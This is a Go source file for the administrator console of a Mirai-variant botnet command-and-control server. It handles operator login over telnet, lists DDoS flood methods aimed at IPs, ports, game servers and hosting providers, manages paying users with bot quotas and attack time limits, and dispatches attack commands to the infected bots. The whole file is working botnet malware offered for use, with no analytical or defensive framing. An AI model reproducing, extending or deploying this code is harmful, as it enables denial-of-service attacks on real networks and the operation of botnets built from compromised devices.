package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
	this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\033[01;31mWELCOME\033[01;36m | MIRAI\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;31mUSER\033[31m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;31mPassword\033[31m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }
	//Attempt  Login
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[01;33mCrecking... \033[01;33mPlease wait \033[01;33m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
    this.conn.Write([]byte("\r\n"))

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
	    this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte("\r\033[91m[!] Invalid login!\r\n"))
        this.conn.Write([]byte("\033[91mPress any key to exit\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d ZOMBIS | MIRAI | Users: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;31m MIRAI \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))


    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[1;31m" + username + "\x1b[1;0m@\x1b[1;0mMIRAI\x1b[1;31m~# \033[0m"))
        cmd, err := this.ReadLine(false)

        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		
			if cmd == "clear" || cmd == "cls" || cmd == "c" {
				this.conn.Write([]byte("\033[2J\033[1H"))
				this.conn.Write([]byte("\r\n"))
                this.conn.Write([]byte("\x1b[1;31m MIRAI \r\n"))
                this.conn.Write([]byte("\r\n"))
                this.conn.Write([]byte("\r\n"))
				continue
			}
		
			if cmd == "help" || cmd == "HELP" || cmd == "?" { // display help menu
                this.conn.Write([]byte("\r\n"))
                this.conn.Write([]byte("\x1b[1;91m  ╔═════════════════════════════════════════════════════════════════╗\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;91m  ║  \x1b[91m METHODS     \x1b[90m- \x1b[0mSHOWS LSIT METHODS \x1b[1;91m║\r\n")); 
                this.conn.Write([]byte("\x1b[1;91m  ║  \x1b[91m ADMIN       \x1b[90m- \x1b[0mADD ADMIN          \x1b[1;91m║\r\n")); 
                this.conn.Write([]byte("\x1b[1;91m  ║  \x1b[91m BOTS        \x1b[90m- \x1b[0mNUMBER BOTS        \x1b[1;91m║\r\n"));                                         
                this.conn.Write([]byte("\x1b[1;91m  ║  \x1b[91m CREDITS:    \x1b[90m- \x1b[0mCREDITS            \x1b[1;91m║\r\n"));                                         
                this.conn.Write([]byte("\x1b[1;91m  ║  \x1b[1;91m CLS/CLEAR:\x1b[90m- \x1b[0mCLEAR TERMINAL     \x1b[1;91m║\r\n"));                
                this.conn.Write([]byte("\x1b[1;91m  ╚══════════════════════════════════════════════════════════════════╝ \r\n"))                               
                continue



                this.conn.Write([]byte("\r\n"))
				continue
			}
		
			if cmd == "METHODS" || cmd == "methods" || cmd == "attack" || cmd == "ATTACK" { // display methods and how to send an attack
                this.conn.Write([]byte("\r\n"))
                this.conn.Write([]byte("\x1b[91m   ╔═════════════════\033[1;0m══════════════════╗ \x1b[0m\r\n"))
                this.conn.Write([]byte("\033[91m   ║ !udp      [IP] [\033[1;0mTIME]dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\033[91m   ║ !udpmix*  [IP] [\033[1;0mTIME]dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\033[91m   ║ !udpplain [IP] [\033[1;0mTIME]dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\033[91m   ║ !std      [IP] [\033[1;0mTIME]dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\033[91m   ║ !greeth   [IP] [\033[1;0mTIME]dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\033[91m   ║ !tcp      [IP] [\033[1;0mTIME]dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\x1b[91m ╔═╚═════════════════\033[1;0m══════════════════╝═╗ \r\n"))
                this.conn.Write([]byte("\033[91m ║ !stomp       [IP] \033[1;0m[TIME] dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\033[91m ║ !dns         [IP] \033[1;0m[TIME] dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\033[91m ║ !vse         [IP] \033[1;0m[TIME] dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\033[91m ║ !ack         [IP] \033[1;0m[TIME] dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\033[91m ║ !xmas        [IP] \033[1;0m[TIME] dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\x1b[91m ╚╔══════════════════\033[1;0m═══════════════════╗╝ \r\n"))
                this.conn.Write([]byte("\033[91m  ║ !ts3        [IP] \033[1;0m[TIME]dport=[PORT] ║\r\n"))
                this.conn.Write([]byte("\033[91m  ║ !fivem-kill*[IP] \033[1;0m[TIME]dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\033[91m  ║ !fivem-ovh* [IP] \033[1;0m[TIME]dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\033[91m  ║ !ovhkill*   [IP] \033[1;0m[TIME]dport=[PORT] ║ \r\n"))
                this.conn.Write([]byte("\033[91m  ║ !ovh        [IP] \033[1;0m[TIME]dport=[PORT] ╚═╗ \r\n"))
                this.conn.Write([]byte("\033[91m  ║ !cfnull     [IP] \033[1;0m[TIME]domain=[PORT]  ║ \r\n"))
                this.conn.Write([]byte("\033[91m  ╚══════════════════\033[1;0m═════════════════════╝   \r\n"))  
                continue
			}
		
			if userInfo.admin == 1 && cmd == "admin" {
                this.conn.Write([]byte("\r\n"))
				this.conn.Write([]byte("\033[01;37m \033[1;0madduser -> \033[1;35mAdd normal user  \033[01;37m\r\n"))
                this.conn.Write([]byte("\r\n"))
				continue
			}
			if cmd == "credits" || cmd == "CREDITS" {
                this.conn.Write([]byte("\r\n"))
				this.conn.Write([]byte("\033[01;37m \033[1;33mOwner: \033[1;35m DANO	          \033[01;37m\r\n"))
				this.conn.Write([]byte("\033[01;37m \033[1;33mDeveloper: \033[1;35mDANO \033[01;37m\r\n"))
                this.conn.Write([]byte("\r\n"))
				continue
			}
		
			if cmd == "bots" || cmd == "BOTS" {
			botCount = clientList.Count()
				m := clientList.Distribution()
				for k, v := range m {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;0m%s: \x1b[1;33m%d\033[0m\r\n\033[0m", k, v)))
				}
				this.conn.Write([]byte(fmt.Sprintf("\033[1;33mTotal de Simps: \033[1;33m[\033[1;33m%d\033[1;33m]\r\n\033[0m", botCount)))
				continue
			}
			
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
        if cmd[0] == '*' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '-' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
